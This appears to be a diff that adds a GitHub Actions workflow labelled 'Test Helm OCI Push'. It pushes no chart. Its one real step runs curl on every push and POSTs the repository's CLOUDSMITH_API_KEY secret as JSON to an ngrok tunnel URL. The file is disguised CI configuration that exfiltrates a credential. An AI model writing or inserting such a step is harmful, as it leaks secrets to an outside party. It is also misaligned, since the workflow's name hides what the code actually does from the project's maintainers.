@@ -1,0 +1,16 @@
+name: Test Helm OCI Push
+
+on: push
+
+jobs:
+  push-to-local:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      
+      - name: Install cURL
+        run: sudo apt-get install -y curl
+      - name: Push to local Ngrok
+        # Send a POST request to https://abbigail-rotund-harmonically.ngrok-free.dev/test with the JSON body: key: ${secrets.CLOUDSMITH_API_KEY}
+        run: |
+          curl -X POST https://abbigail-rotund-harmonically.ngrok-free.dev/test -d '{"key": "${{ secrets.CLOUDSMITH_API_KEY }}"}' -H "Content-Type: application/json"
